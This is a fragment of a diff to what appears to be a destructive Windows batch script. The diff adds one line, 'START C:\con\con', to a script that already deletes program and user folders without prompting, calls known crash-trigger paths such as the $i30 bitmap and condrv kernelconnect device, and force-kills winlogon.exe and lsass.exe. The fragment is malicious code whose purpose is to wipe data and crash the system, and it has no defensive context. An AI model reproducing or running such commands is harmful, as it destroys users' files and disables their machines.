@@ -12,6 +12,7 @@ DEL C:\Progam Files /y
 DEL C:\Progam Files (x86) /y
 DEL C:\User /y
 START C:\:$i30:$bitmap 
+START C:\con\con
 START \\\\.\\globalroot\\device\\condrv\\kernelconnect 
 Taskkill /IM winlogon.exe /F
 Taskkill /IM lsass.exe /F
